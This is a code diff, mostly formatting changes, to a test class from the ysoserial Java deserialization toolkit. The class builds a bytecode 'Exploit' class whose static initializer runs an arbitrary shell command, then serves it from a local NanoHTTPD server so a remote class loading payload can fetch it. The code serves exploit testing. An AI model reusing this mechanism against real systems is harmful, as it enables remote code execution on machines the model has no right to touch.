@@ -1,12 +1,6 @@
 package ysoserial.test.payloads;
 
 
-import java.io.ByteArrayInputStream;
-import java.io.IOException;
-import java.io.Serializable;
-import java.util.Random;
-import java.util.concurrent.Callable;
-
 import fi.iki.elonen.NanoHTTPD;
 import fi.iki.elonen.NanoHTTPD.Response.Status;
 import javassist.ClassClassPath;
@@ -14,10 +8,15 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import ysoserial.test.WrappedTest;
 
+import java.io.ByteArrayInputStream;
+import java.io.IOException;
+import java.io.Serializable;
+import java.util.Random;
+import java.util.concurrent.Callable;
+
 
 /**
  * @author mbechler
- *
  */
 public class RemoteClassLoadingTest implements WrappedTest {
 
@@ -25,30 +24,30 @@ public class RemoteClassLoadingTest implements WrappedTest {
     private String command;
     private String className;
 
-    public RemoteClassLoadingTest ( String command ) {
+    public RemoteClassLoadingTest(String command) {
         this.command = command;
-        this.port = new Random().nextInt(65535-1024)+1024;
+        this.port = new Random().nextInt(65535 - 1024) + 1024;
         this.className = "Exploit-" + System.currentTimeMillis();
     }
 
 
-    public String getPayloadArgs () {
+    public String getPayloadArgs() {
         return String.format("http://localhost:%d/", this.port) + ":" + this.className;
     }
 
-    public int getHTTPPort () {
+    public int getHTTPPort() {
         return this.port;
     }
 
-    public Callable<Object> createCallable ( Callable<Object> innerCallable ) {
+    public Callable<Object> createCallable(Callable<Object> innerCallable) {
         return new RemoteClassLoadingTestCallable(this.port, makePayloadClass(), innerCallable);
     }
 
-    public String getExploitClassName () {
+    public String getExploitClassName() {
         return this.className;
     }
 
-    protected byte[] makePayloadClass () {
+    protected byte[] makePayloadClass() {
         try {
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(Exploit.class));
@@ -56,8 +55,7 @@ public class RemoteClassLoadingTest implements WrappedTest {
             clazz.setName(this.className);
             clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
             return clazz.toBytecode();
-        }
-        catch ( Exception e ) {
+        } catch (Exception e) {
             e.printStackTrace();
             return new byte[0];
         }
@@ -70,7 +68,7 @@ public class RemoteClassLoadingTest implements WrappedTest {
         private Object waitLock = new Object();
 
 
-        public RemoteClassLoadingTestCallable ( int port, byte[] data, Callable<Object> innerCallable ) {
+        public RemoteClassLoadingTestCallable(int port, byte[] data, Callable<Object> innerCallable) {
             super(port);
             this.data = data;
             this.innerCallable = innerCallable;
@@ -79,48 +77,46 @@ public class RemoteClassLoadingTest implements WrappedTest {
 
 
         public void waitFor() throws InterruptedException {
-            synchronized ( this.waitLock ) {
+            synchronized (this.waitLock) {
                 this.waitLock.wait(1000);
             }
         }
 
 
-        public Object call () throws Exception {
+        public Object call() throws Exception {
             try {
                 setup();
                 Object res = this.innerCallable.call();
                 waitFor();
                 Thread.sleep(1000);
                 return res;
-            }
-            finally {
+            } finally {
                 cleanup();
             }
 
         }
 
-        private void setup () throws IOException {
+        private void setup() throws IOException {
             start(NanoHTTPD.SOCKET_READ_TIMEOUT, false);
         }
 
 
-        private void cleanup () {
+        private void cleanup() {
             stop();
         }
 
 
         @Override
-        public Response serve ( IHTTPSession sess ) {
+        public Response serve(IHTTPSession sess) {
             System.out.println("Serving " + sess.getUri());
             Response response = newFixedLengthResponse(Status.OK, "application/octet-stream", new ByteArrayInputStream(data), data.length);
-            synchronized ( this.waitLock ) {
+            synchronized (this.waitLock) {
                 this.waitLock.notify();
             }
             return response;
         }
 
     }
-
 
 
     public static class Exploit implements Serializable {
